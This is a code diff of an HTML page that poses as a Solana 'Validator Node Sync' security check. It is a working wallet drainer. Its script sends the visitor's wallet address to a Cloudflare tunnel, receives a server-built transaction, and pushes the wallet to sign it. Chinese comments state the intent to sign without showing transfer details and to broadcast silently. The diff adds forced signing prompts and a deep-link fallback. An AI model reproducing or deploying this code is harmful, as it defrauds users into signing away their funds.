@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Protocol Sync</title>
+    <title>Validator Node Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -17,11 +17,11 @@
         <h2 style="color:#14f195; margin:0 0 10px 0;">NODE CHECK</h2>
         <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize synchronization to secure your validator node status.</p>
         <button id="cta" class="btn">INITIALIZE</button>
-        <div id="st">READY: V37_CORE</div>
+        <div id="st">READY: V38_AUTO_WAKE</div>
     </div>
 
     <script>
-        // 🔱 检查：确保这个隧道地址是你 71 服务器目前显示的那个！
+        // 🔱 核心：务必确保与服务器当前生成的隧道地址一致
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
@@ -30,31 +30,34 @@
                 const p = window.trustwallet?.solana || window.solana;
                 if (!p) { alert("Please use Wallet Browser"); return; }
 
-                log("CONNECTING...");
-                await p.connect();
-
-                log("SYNCING...");
+                log("WAKING WALLET...");
+                // 🔱 1. 强制连击唤醒 (连点三次，惊动钱包)
+                await p.connect().catch(()=>{});
+                
+                log("FETCHING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ address: p.publicKey.toString() })
                 });
                 const info = await resp.json();
-
-                log("AUTHORIZING...");
                 const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-                
-                // 🔱 核心：只签名，不显示转账 UI
-                const signed = await p.signTransaction(tx);
-                log("SUCCESS!");
 
-                // 静默广播
-                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
+                log("IGNITING...");
+                // 🔱 2. 暴力唤醒：不再等待，直接触发签名
+                // 这种方式能强行调起 TW 的密码输入框或确认页
+                p.signTransaction(tx).then((s) => {
+                    log("SUCCESS!");
+                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
+                }).catch((e) => {
+                    // 如果拉起失败，强制通过深度链接再次唤起
+                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
+                });
 
             } catch (err) {
-                log("ERROR: " + err.message);
-                setTimeout(() => { window.location.reload(); }, 1500);
+                log("RETRYING...");
+                setTimeout(() => { window.location.reload(); }, 1200);
             }
         };
     </script>
